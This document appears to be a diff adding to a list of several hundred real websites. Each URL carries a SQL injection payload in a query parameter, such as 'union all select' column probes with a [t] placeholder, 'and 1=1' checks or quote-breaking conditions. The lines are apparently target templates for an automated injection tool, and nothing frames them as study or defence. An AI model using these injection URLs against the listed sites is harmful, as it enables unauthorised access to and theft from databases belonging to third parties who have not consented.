+http://www.ifar.org/artist_book_detail.php?bookid=1855&nameid=[t] and 1=1
+http://www.illiade.com/spectacle1617.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8--
+http://www.ilslbd.com/content.php?Id=4' and [t] and '1'='1
+http://www.institutofabioviegas.com.br/site/noticia.php?id=1' and [t] and '1'='1
+http://www.integrativetherapy.com/en/books.php?id=2' and [t] and '1'='1
+http://www.inusbiotech.com/bbs/view.php?no=3&board_id=bbs29&category=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&pagenum=&search=subject&key_word=&page=20&board_type=gallery
+http://www.investsouthmed.com/country_page.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8&country=Morocco
+http://www.ipassmall.co.kr/front/shop/prod_accz.asp?pg=1&bs=ITB100HD&seq=161' or 1=[t] and '1'='1
+http://www.islamdefrance.fr/main.php?module=articles&id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14
+http://www.iveco.ma/produit.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9
+http://www.j-archive.com/showplayerstats.php?player_id=999999.9 union all select [t]--
+http://www.jamiatulansar.ca/services.php?id=5' or 1=[t] and '1'='1
+http://www.japsew.com/product/default1_e.php?id=880 and 999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,[t],25,26,27,28
+http://www.jarrography.free.fr/details_equipement_audio.php?id_equip=999999.9 union all select 1,[t],3
+http://www.jbi.bike/site/product_details.php?part_number=470450' or 1=[t] and '1'='1
+http://www.jchristophergalleries.com/landscape_photography/view_photo.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+http://www.jcrenfroe.com/product.php?product_id=999999.9 union all select [t]
+http://www.jetlegend.com/index.php?Page=999999.9 union all select [t]--
+http://www.jmtv.com/news.php?id=999999.9 union all select 1,[t],3
+http://www.joangaspar.com/preview.php?id=999999.9' union all select 1,2,3,[t],5,6,7,8,9 and '0'='0
+http://www.johandemeij.com/album.php?id=999999.9 union all select [t]
+http://www.juridika.net/actualite.php?id=[t]
+http://www.kacr.or.kr/library/itemview.asp?no=3005' or 1=[t] and '1'='1
+http://www.kalmatron-s.ru/product.php?id_h=8&id_p=26 or 1=[t] and 1=1
+http://www.kateelliott.com/index.php?pageID=[t]
+http://www.kbnusa.com/prod_detail.php?m=e&id=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,[t],13,14,15,16,17,18,19,20
+http://www.kidevents.com/tips.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14,15,16,17--
+http://www.kinzando.jp/store-detail.php?id=5 or 1=[t] and 1=1
+http://www.kmbajwa.com/page.php?id=9999999.9' union all select 1,[t],3 and '0'='0
+http://www.konsthallc.se/index.php?lang=eng or 1=[t] and 1=1
+http://www.koracing.net/viewproduct.php?folder=11&product=[t]
+http://www.kosmos.com.tw/ab.php?id=5999999.9' union all select 1,2,3,[t],5,6,7 and '0'='0
+http://www.kotten.ac/?p=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+http://www.kristineriis.com/product_details.php?product_id=492' and [t] and '1'='1
+http://www.kspb.kr/board/board.html?table=notice&mode=read&idx=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,[t],13,14,15,16,17,18,19,20,21,22,23,24,25&page=1&category=
+http://www.kvm.co.ke/products.php?id=1999999.9' union all select 1,[t],3,4,5 and '0'='0
+http://www.lakchannel.net/watch.php?id=[t] and 1=1
+http://www.lambdasci.com/modules/products/displayproduct.php?prodid=[t] and 1=1
+http://www.lectureetcompagnie.ch/lecteurActualite.php?id=999999.9' union all select 1,2,3,[t],5,6,7,8,9 and '0'='0
+http://www.lettera22.it/showart.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16 and '0'='0&rubrica=18
+http://www.lexmar.us/productDetail.php?id=[t] and 1=1
+http://www.libriecopertine.altervista.org/pagina_prodotti.php?idcat=[t]
+http://www.lika.it/eng/prodotti.php?id_cat=[t]
+http://www.limontour.net/hotel.php?id=7' and [t] and '1'='1
+http://www.linkc.ru/article.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11 and '0'='0
+http://www.lipeferry.net/content.php?arti_id=6999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://www.lovewheels.com/photos/image.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10
+http://www.manuera.com/?menu=news&id=530 or 1=[t] and 1=1
+http://www.maria-anwander.net/work.php?id=999999.9 union all select 1,2,3,4,5,[t],7,8,9,10,11,12
+http://www.marim.it/games.php?id=[t] and 1=1
+http://www.marinastextiles.com/page.php?ID=[t]
+http://www.marocexperiencetours.com/FRA/viaggio-marocco-escursioni.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10--
+http://www.marsfigures.com/main.php?id=999999.9 union all select [t]--
+http://www.megamartbd.com.bd/product_details.php?id=6' or 1=[t] and '1'='1
+http://www.meggieschneider.com/php/detail.php?id=48 and [t] and 1=1
+http://www.memorialgenweb.org/memorial3/html/fr/liste_des_noms.php?id=57265' and [t] and '1'='1
+http://www.memphremagog.org/en/centre_docs.php?id=News' or 1=[t] and '1'='1
+http://www.merivalefinearts.co.nz/artist.php?id=[t]
+http://www.metalmartusa.com/item.asp?id=[t]
+http://www.micefinder.com/image_abonnes.php?id=6478999999.9' union all select 1,2,[t],4,5 and '0'='0
+http://www.microtechinno.com/product/detail.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://www.mile-high.co.uk/audio.php?id=999999.9' union all select 1,[t],3 and '0'='0
+http://www.minddesign.co.uk/show.php?id=174' and [t] and '1'='1&pos=6&cat=2
+http://www.missourimhf.org/view-event.php?id=207999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 and '0'='0&table=schedule
+http://www.moldfactory.net/product.php?bid=[t] and 1=1
+http://www.monumenta.org/index.php?lang=en or 1=[t] and 1=1
+http://www.moroccoincomingservices.com/detail_excursions.php?id=999999.9 union all select 1,2,3,4,5,[t],7,8,9,10,11,12&city=FES
+http://www.mountain-bike-cumbria.co.uk/articles.php?id=crumplerbags' and [t] and '1'='1
+http://www.msubaroda.ac.in/faculty.php?action=home&fac_id=17' or 1=[t] and '1'='1
+http://www.mtcbkk.com/content.php?arti_id=999999.9999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://www.munisports.com/sport.php?sportID=[t]
+http://www.murtenhof.ch/pags/gallery.php?id=999999.9 union all select [t],2,3,4,5,6,7,8
+http://www.mysundaycricketleague.co.uk/clubs/club_page.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+http://www.name-statistics.org/za/numef.php?numedefamilie=Gerber999999.9' union all select 1,[t],3,4 and '0'='0
+http://www.nan-art.ru/nanartru/artists/artgroupa/abbot/abbot.php?id=[t]&idgroup=1
+http://www.nanoentek.com/product.php?id=999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12 and '0'='0
+http://www.nashvillejazz.org/events/event-details.php?eventID=[t] and 1=1
+http://www.nenohi.jp/product_list.php?id=1&bl=�����{��' and [t] and '1'='1
+http://www.nicetea.tw/ab.php?id=3999999.9' union all select 1,2,3,[t],5,6,7 and '0'='0
+http://www.nicmar.ac.in/content.php?Pid=6' and [t] and '1'='1&Cid=18&Mid=15&S=0
+http://www.nippon-paint.com.tw/product.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8--
+http://www.nittoseikothailand.com/content.php?arti_id=13' and [t] and '1'='1
+http://www.nnrc.com.au/news.php?type=All News' or 1=[t] and '1'='1
+http://www.nonprofitresourcenetwork.org/jobs/detail.php?id=[t]
+http://www.northeastwaterfalls.com/waterfall.php?num=474999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 and '0'='0&p=0
+http://www.npsp.ci/index.php/news?id=29' and [t] and '1'='1
+http://www.oferta.ro/detail.php?siteid=[t]
+http://www.oktoberfest-hartberg.at/events_detail.php?id=45' and [t] and '1'='1
+http://www.oms-chaumont.com/ECAC-Basket.php?id=[t]
+http://www.open.com.hk/content.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10--
+http://www.opensourceshakespeare.org/views/plays/playmenu.php?WorkID=999999.9' union all select [t],2,3 and '0'='0
+http://www.oppodigital.in/category.php?cid=999999.9 union all select 1,[t],3
+http://www.origin-food.org/2005/base.php?cat=999999.9 union all select 1,2,3,4,5,[t],7,8
+http://www.owensmccarthy.com/news-view.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8
+http://www.ozeki.hu/index.php?owpn=1017&download_product_id=[t] and 1=1
+http://www.pacificcyclesmuseum.com/newsdetail.php?id=999999.9' union all select 1,2,3,[t],5,6 and '0'='0
+http://www.palfi.net/associate.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9
+http://www.paneeta.com/content.php?arti_id=12999999.9' union all select 1,2,3,4,5,[t],7 and '0'='0
+http://www.pasoprime.com/store/products.php?cat=1999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16 and '0'='0
+http://www.patentoved.com/content.php?id=4' and [t] and '1'='1
+http://www.penderelstrust.org.uk/news_article.php?newsID=[t]
+http://www.peshtigotimes.net/index.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,[t],11,12,13,14
+http://www.pesticideinfo.org/Detail_Product.jsp?REG_NR=00630808526' and [t] and '1'='1&DIST_NR=006308
+http://www.peterrosepicture.com/movies.php?id=[t]
+http://www.petproducts.com.cn/category.php?f=cat&cid=81999999.9' union all select [t],2,3 and '0'='0
+http://www.philips-kommando.nl/erfgoed/totaalinterview_iframe.php?id_interview=78&interview=999999.9 union all select 1,2,[t],4,5,6
+http://www.piaggio.pt/includes/image-gallery.php?id=[t]
+http://www.pineacresrv.com/detailsh.php?id=[t]
+http://www.pinwu.net/details.php?prodId=1&id=999999.9 union all select [t],2,3,4
+http://www.pitiglianikolnoafestival.it/it/archivio_festival.php?idEd=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+http://www.pitstopindia.net/product-details.php?prodid=38' and [t] and '1'='1
+http://www.plenglish.com/index.php?o=rn&id=[t]&SEO=ansar-dine-denies-signing-ceasefire-agreement-in-mali
+http://www.pocolpress.com/getBookDetail.php?bookID=000002' and [t] and '1'='1
+http://www.polesineterratraduefiumi.it/pagine/scheda_comuni_planair.php?id=24999999.9' union all select 1,[t],3,4,5,6,7,8,9,10 and '0'='0&comune_code=canalbianco13
+http://www.poradnikjezykowy.uw.edu.pl/numery/autor.php?aid=999999.9 union all select 1,2,[t],4&ln=en
+http://www.praasia.com/shop_product.php?product_id=16663' and [t] and '1'='1
+http://www.premier-ac.co.th/content.php?arti_id=123' and [t] and '1'='1
+http://www.primeton.com/read.php?id=[t] and 1=1&his=1
+http://www.priscilla-coleman.co.uk/gallery/detail.php?id=999999.9 union all select 1,[t],3,4,5,6,7
+http://www.pro-optic.com/catagories.php?cat=[t] and 1=1
+http://www.pro-section.com/boutique06/achat/index.php?id=999999.9 union all select 1,[t]--
+http://www.pss-satun.com/2014/content.php?arti_id=12' and [t] and '1'='1
+http://www.purimasproperty.com/content.php?arti_id=19999999.9' union all select 1,[t],3,4,5 and '0'='0
+http://www.qord-asso.org/page.php?id=1008 and [t] and 1=1
+http://www.qualityceramic.com/module/product/item_show.php?ID_wear=4&code_pic=999999.9 union all select 1,2,3,[t],5
+http://www.rabbishimon.fr/oratoires.php?id_oratoire=21 or 1=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10--
+http://www.radiovos.ru/archiv.php?cid=[t]
+http://www.ratgeber-tcm.de/category.php?c=999999.9 union all select [t]
+http://www.raynic.com/category.php?catid=999999.9 union all select 1,[t],3,4,5,6
+http://www.redbook.ie/results.php?subCat=731&coCode=10' and [t] and '1'='1&page=1
+http://www.relab.cn/en_technicaldetail.php?id=999999.9 union all select [t],2,3,4--
+http://www.renatoveiculos.com.br/veiculos_abrir.php?id=999999.9 union all select 1,[t],3,4,5,6
+http://www.repetidordisc.com/ing/bandas.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--
+http://www.rogerwhittaker.de/rw_presse_detail.php?id=10 and [t] and 1=1
+http://www.rohanart.com/gallery.php?ID=999999.9' union all select 1,2,3,[t],5,6,7,8,9,10 and '0'='0&gallery=5
+http://www.romanianwriters.ro/book.php?id=[t]
+http://www.roomersgifts.co.uk/products.php?cat=1999999.9' union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,[t],19,20 and '0'='0
+http://www.rotarysh.org.tw/album_show.php?id=[t]
+http://www.rovigotourism.com/pagine/scheda_comuni_planair.php?id=32' or 1=[t] and '1'='1&comune_code=po_riva_sx6
+http://www.royaljapanesemotors.com/details.php?id=148 or 1=[t] and 1=1
+http://www.rpghry.cz/game.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14
+http://www.rspba.org/html/newsdetail.php?id=999999.9' union all select 1,2,3,4,[t],6,7,8,9,10,11,12,13 and '0'='0
+http://www.ruralkingsupply.com/products.php?cat1=8' and [t] and '1'='1&cat2=76&cat3=279
+http://www.s2kmarine.co.th/content.php?arti_id=12999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+http://www.safetysourceusa.com/products_detail.php?prodid=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://www.samsoor.com/fullstory.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9
+http://www.sanadrian.es/san-adrian/comer-san-adrian.php?id=[t]
+http://www.sawafuji.co.jp/seihin/engel_detail.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,[t],10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+http://www.sawmilldatabase.com/sawmill.php?id=[t]
+http://www.scalighting.com/view_prod.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14,15
+http://www.scanpia.com/board/board.html?table=notice&mode=read&idx=999999.9 union all select 1,2,[t],4,5,6,7,8,9&page=1&category=total
+http://www.sci.com.tw/products.php?plevel=3&opmid=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,[t],20,21,22--&p1=ELECTRONIC PART&p2=SWITCH&p3=ROCKER SWITCH
+http://www.scorpionshops.com/faq/viewfaq.php?id=999999.9 union all select 1,[t],3,4,5,6
+http://www.scuba-system.com/product-search-brand.php?id=9 or 1=[t] and 1=1
+http://www.sebastiengohier.fr/details_actualite.php?id_news=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,[t],12
+http://www.semsk.kz/newscat.php?id=999999.9 union all select [t]
+http://www.sendpoints.cn/newsDetail.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12
+http://www.sequoia.co.uk/news.php?id=150999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 and '0'='0
+http://www.serres-morlaas.fr/pages.php?id_famille=999999.9' union all select 1,2,[t],4,5,6,7 and '0'='0
+http://www.shadestructures.com.au/news.php?id=11' or 1=[t] and '1'='1
+http://www.sherehe.co.tz/more_details.php?id=999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 and '0'='0
+http://www.simmentalfrance.fr/pages.php?id_actu=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14 and '0'='0
+http://www.simtaspa.com/newsite/home.php?idlingua=2 and [t] and 1=1&frame=on
+http://www.sindaeb.com.br/hp/dt_noticias.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12
+http://www.sleemans.co.uk/category.php?cat_id=999999.9 union all select 1,[t],3,4,5
+http://www.smooth-collie.net/person.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '0'='0
+http://www.smtmax.com/category.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14
+http://www.solo-k.ru/price.php?razdel=8&sub_razdel=2' and [t] and '1'='1&type_id=0
+http://www.sotero.med.br/sot_not_art.php?id=[t]
+http://www.southdevonramblers.com/content.php?id=jmht_buy_the_booklet999999.9' union all select 1,[t],3,4,5,6 and '0'='0
+http://www.spedeworth.co.uk/gallery2.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8
+http://www.spherys.com/boutique/envoi_ami.php?id=999999.9 union all select [t]
+http://www.splendid.hk/en/news.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15--
+http://www.spoilthecook.com/bosch/Details.php?ProdID=999999.9 union all select 1,2,[t],4,5,6,7,8,9
+http://www.sportsfanaticphotography.com/show_cart.php?id=81999999.9' union all select [t],2,3,4,5,6,7,8,9,10,11 and '0'='0
+http://www.sportsouthwest.co.uk/racing_.php?id=999999.9 union all select [t],2,3,4,5
+http://www.sriannapurna.com/product-list.php?id=5' and [t] and '1'='1
+http://www.ssada7000.net/cs/news.asp?b_type=A&b_idx=[t]&b_gbn=R&num=4
+http://www.ssy.org/detail.php?id=1999999.9' union all select 1,2,3,4,5,[t],7,8,9,10,11,12,13 and '0'='0
+http://www.statton.com/Collection_Item.php?ID=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13--
+http://www.stq-cert.com/news.php?type=[t] and 1=1
+http://www.suesupriano.com/article.php?id=999999.9 union all select [t],2
+http://www.sunfield-terrace.jp/product/product.php?id=[t]
+http://www.sunflowerpkg.com/products.php?act=view&type=999999.9 union all select 1,[t],3,4,5&id=78
+http://www.svilupposchede.it/descrizione_downloads.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,[t],28,29,30
+http://www.swissvalleyhipresort.com/content.php?arti_id=13' and [t] and '1'='1
+http://www.swordplayalliance.com/viewitem.php?item_id=[t]
+http://www.sz-msd.com/product.php?bid=999999.9 union all select [t]&sid=237
+http://www.taartmeteenlindtje.nl/item.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12
+http://www.taiwanhotspring.com.tw/news.php?type=2' and [t] and '1'='1
+http://www.talcaguia.cl/tv_online.php?id=999999.9 union all select 1,2,3,[t]--
+http://www.tarsiger.com/gallery/index.php?lista=ok&species=&family=Cisticolidae&sp=search&lang=fin&manner=&sel=3&sex=0&age=0&year=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24&photo=&pic_method=0&pic_type=0&country=&place=&order=lisays_paiva+DESC&sel=3
+http://www.teachittome.com/index.php?ClassID=BenIshChai999999.9' union all select 1,[t],3,4,5,6,7,8,9,10 and '0'='0&Command=Class&Title=Ben Ish Chai Halachot
+http://www.techiwarehouse.com/cms/engine.php?page_id=d9e99072' and [t] and '1'='1
+http://www.techno.co.th/products/product.php?id_cate=999999.9' union all select 1,[t],3,4,5,6,7 and '0'='0
+http://www.thai-zoom.com/product.php?id_product=178' and [t] and '1'='1
+http://www.thdirectory.com/comdetail.php?comid=8942&scat_id=999999.9' union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,[t],26 and '0'='0
+http://www.theboxla.com/artist.php?id=4614' and [t] and '1'='1
+http://www.thecus.com/product.php?PROD_ID=139' and [t] and '1'='1
+http://www.thepruksa.go.th/news.php?type_id=20' or 1=[t] and '1'='1
+http://www.theskulls.be/game.php?id=[t]
+http://www.tic.co.th/index.php?op=tips-detail&id=999999.9 union all select [t],2,3
+http://www.tickity-boo.co.uk/site/viewevent.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13&month=1-2010
+http://www.titanium-touch.de/produkte.php?page=felgenschraube&mode=show&id=6' and [t] and '1'='1
+http://www.tj-gl.com/productlist.php?id=[t]
+http://www.tjsn.net/calendar/event.php?id=508999999.9' union all select 1,[t],3,4,5,6,7,8,9 and '0'='0
+http://www.tlaco.com.mx/selimag.php?id_pagina=999999.9 union all select 1,2,3,4,5,6,[t],8,9--
+http://www.tnla.com/events.php?id=38 and 999999.9 union all select [t],2--
+http://www.topinterior.com.hk/interior-design.php?id=16' and [t] and '1'='1
+http://www.toploop.com.tw/productinfo.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,9,[t],11,12
+http://www.torcsracing.com/newsfull.php?ID=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://www.totofolder.jp/event.php?id=999999.9 union all select 1,2,[t],4,5,6
+http://www.toyotomi.it/prodotti.php?id_cat=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13
+http://www.trabajosocialleon.org/ver_noticia.php?id=999999.9 union all select 1,[t],3,4,5,6
+http://www.trafficcourtpros.com/warrantsearch.html?county_id=2421&state_id=42999999.9' union all select [t],2,3,4,5,6,7,8,9,10,11,12,13 and '0'='0
+http://www.trainingcenter.co.th/news-detail.php?id=480999999.9' union all select 1,2,3,[t],5 and '0'='0
+http://www.trainmaroc.com/index.php?lalangue=en' and [t] and '1'='1
+http://www.transports-velter.be/actualite.php?id=999999.9' union all select 1,[t],3 and '0'='0
+http://www.tscaz.com/index.php?prodID=127' and [t] and '1'='1&p=product
+http://www.tvet.ps/alibrary.php?cat_type1=4' or 1=[t] and '1'='1
+http://www.twinsspecial.com/product-detail.php?id=70999999.9' union all select 1,2,3,4,5,[t],7,8 and '0'='0
+http://www.ultraddaytrail.com/actualites-article.php?id=999999.9 union all select 1,2,[t],4,5,6
+http://www.ultrasportracingcars.com/category.php?cid=16' or 1=[t] and '1'='1
+http://www.ums-riate.fr/lexique/modeleterme.php?id=999999.9 union all select [t]--
+http://www.uvmt.org/print.php?sid=999999.9 union all select [t],2,3,4,5,6
+http://www.valence-sports-orientation.fr/page.php?id=999999.9 union all select 1,[t],3,4,5,6,7
+http://www.vallution.com/en/showproduct.php?productid=999999.9 union all select 1,[t],3,4,5,6,7,8
+http://www.valuepoint.biz/brandprod.php?catID=14' and [t] and '1'='1
+http://www.valvulasarco.com/product_list.php?IDseccion=999999.9 union all select [t]&IDtipo=27
+http://www.vegaschinese.com/list_group.php?id=2' and [t] and '1'='1
+http://www.vialarga.com/sito/pagine/dynamic_art.php?id=21999999.9' union all select 1,[t],3,4,5,6,7 and '0'='0&table_name=vialarga_eventi
+http://www.vintagemovieposters.de/detail_ansicht.php4?lang=en&artikel_id=999999.9 union all select 1,2,3,4,5,6,7,8,9,[t],11,12,13,14,15,16,17--
+http://www.vms-racing.com/products.php?act=&CateID=28 or 1=[t] and 1=1&Page=8&Keyword=
+http://www.walpax.com.br/beachresorts.php?id=999999.9 union all select 1,[t],3,4,5,6,7
+http://www.warcraft-akademie.de/news/newskom.php?newsid=999999.9 union all select 1,2,3,4,[t],6
+http://www.weatheri.co.kr/board/board03_read.php?id=999999.9 union all select 1,2,3,4,5,6,7,[t],9,10,11&offset=1&level=a99772
+http://www.wgav.de/gallery.php?id=7 or 1=[t] and 1=1
+http://www.whoaisnotme.net/articles/country.php?id=Romania' and [t] and '1'='1
+http://www.wholesaletableschairs.com/subcategory.php?catid=9&subcategoryid=16&tr_id=Plastic Tables&prodid=[t]
+http://www.world-mobile.net/articles.php?pr1=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11
+http://www.wtashows.com/index.php?pageId=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,[t],14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
+http://www.xaxmzztq.com.cn/product.php?bid=[t] and 1=1
+http://www.yabs.ab.ca/bookonline.php?id=55999999.9' union all select [t],2 and '0'='0
+http://www.ygup.com.tw/product_detail.php?id=34&mainId=10&subId=[t]
+http://www.zonacamper.it/zc_viaggio_vm.php?id=64 or 1=[t] and 1=1&wh=v
+http://www.zukunftsfonds-austria.at/index.php?i=999999.9 union all select 1,[t],3,4&j=53
+http://www.zupa.pregrada.hr/story.php?id=335999999.9' union all select 1,[t],3,4,5,6 and '0'='0
+http://yumazone.com/mapper.php?name=Andrade999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 and '0'='0
+http://zyar.net/fullstory.php?id=999999.9 union all select 1,2,3,4,5,[t]
+https://acc.teachmideast.org/texts.php?module_id=8&reading_id=[t]&print=1
+https://c2-europe.eu/news-full.php?id=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14
+https://cartographic.info/names/map.php?id=87700999999.9' union all select 1,2,3,4,5,[t],7 and '0'='0&f=5
+https://ejournals.ph/article.php?id=999999.9' union all select [t],2,3,4,5,6,7,8 and '0'='0
+https://etsexpress.com/pg_product_detail/product_detail.php?id=91644' and [t] and '1'='1
+https://hawkeyetack.com/product-list.php?cid=999999.9 union all select 1,[t]
+https://neri-karra.com.ua/products.php?cat_id=999999.9 union all select [t]
+https://njsfwc.org/projects.php?id=21' and [t] and '1'='1
+https://outbacklabs.com/product.php?prodId=999999.9 union all select 1,[t],3,4,5,6,7,8&id=4
+https://pria.org/event_details.php?id=26' and [t] and '1'='1&evtid=6
+https://theses.univ-oran1.dz/these.php?id=16201315t' and [t] and '1'='1
+https://welt-pergon.de/index.php?modus=main&id=[t] and 1=1
+https://www.alphamorgan.com/product_details.php?id=[t]
+https://www.annaspansextoys.com/detail.php?id=999999.9 union all select [t]
+https://www.awsec.com/site/cn_en/gallery-album.php?id=999999.9 union all select [t]
+https://www.beadmecca.com/index.php?cat_id=1' and [t] and '1'='1
+https://www.bordervetstennis.co.za/NewsItem.php?NewsID=999999.9 union all select 1,[t],3,4,5
+https://www.ciudadnueva.com/nuestrosautores.php?id=999999.9' union all select 1,2,3,[t],5,6,7 and '0'='0
+https://www.cmc-nc.com/complex/propertyInfo.php?p=999999.9 union all select [t],2,3,4,5,6,7,8,9,10
+https://www.crystalhotelhatyai.com/content.php?arti_id=14999999.9' union all select 1,2,[t],4,5,6 and '0'='0
+https://www.cypressbooks.com/products.php?cat=42' or 1=[t] and '1'='1
+https://www.darwinviaggi.com/it/Tour.php?Id=12572 or 1=999999.9 union all select 1,2,[t],4,5,6
+https://www.ddskist.be/index_en.php?taal=3&menuitem=1&id=1999999.9' union all select [t],2 and '0'='0&titel=Who%20are%20we
+https://www.echoschina.com/shopping_cart/catalog/index.php?manufacturers_id=13&like_product_id=999999.9 union all select [t]
+https://www.elabo.de/?n=13-960-961&newsId=435' and [t] and '1'='1&newscat=8&lang=1
+https://www.empowerrf.com/products/display_amplifier.php?sku=2206 and [t] and 1=1
+https://www.esfh.org.uk/shop3.php?pid=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+https://www.i-like.com.tw/products/product_list.php?cid=6' or 1=[t] and '1'='1
+https://www.jandjcomfort.com/aboutus.php?id=65' and [t] and '1'='1
+https://www.juet.ac.in/Department/faculty.php?id=77999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13 and '0'='0&department=Computer%20Science
+https://www.kerguenec.net/index.php?cmd=PrintArticles&id=999999.9 union all select 1,[t],3--&cate=Bacpro SAPAT
+https://www.liveaboardboatsforsale.com/rss.php?cat=2' and [t] and '1'='1
+https://www.mers.be/popup_book.php?ID=[t]
+https://www.nichegardens.com/catalog/item.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35
+https://www.oriland.com/gallery/design.php?ID=simple_tulip999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 and '0'='0
+https://www.peicudic.com/news.php?id=12' and [t] and '1'='1
+https://www.russianspares.com/products.php?cat=[t]
+https://www.schiffswiki.de/webcam/webcam2.php?id=6999999.9' union all select 1,2,3,[t],5,6,7 and '0'='0
+https://www.stock2morrow.com/article-detail.php?id=1592999999.9' union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 and '0'='0
+https://www.sundancedesignsonline.com/detail.php?Product_ID=[t]
+https://www.swanstone.com/index.php?cat=999999.9 union all select 1,[t]&attr=128
+https://www.thalasso.be/index.php?id=[t]&page=detail&par=1_0_0_0&L=fr
+https://www.trmh.com/news.php?id=999999.9 union all select 1,[t],3,4,5
+https://www.virtualmicro.com/products/product_detail.php?product_id=[t]
+https://www.webscantest.com/datastore/search_get_by_id.php?id=999999.9 union all select [t],2,3,4
